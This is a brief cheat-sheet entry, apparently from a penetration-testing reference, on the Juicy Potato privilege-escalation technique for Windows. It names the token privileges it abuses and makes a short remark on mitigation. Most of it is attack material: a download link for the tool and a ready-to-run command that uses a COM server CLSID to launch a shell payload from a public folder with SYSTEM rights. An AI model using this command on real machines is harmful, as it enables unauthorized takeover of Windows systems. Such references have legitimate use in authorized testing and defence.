`Juicy Potato <https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato>`_
**********************************************************************************************************

Summary
#########

If the user has 'SeImpersonate' or 'SeAssignPrimaryToken' privileges then you are *SYSTEM*.

It's nearly impossible to prevent the abuse of all these COM Servers. You could think to modify the permissions of these objects via DCOMCNFG but good luck, this is gonna be challenging.

The actual solution is to protect sensitive accounts and applications which run under the * SERVICE accounts. Stopping DCOM would certainly inhibit this exploit but could have a serious impact on the underlying OS.

Download
##########

https://github.com/ohpe/juicy-potato/releases  

Command
#########


.. code-block:: console

	.\JuicyPotato.exe -t * -p C:\Users\Public\shell-x64.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} 
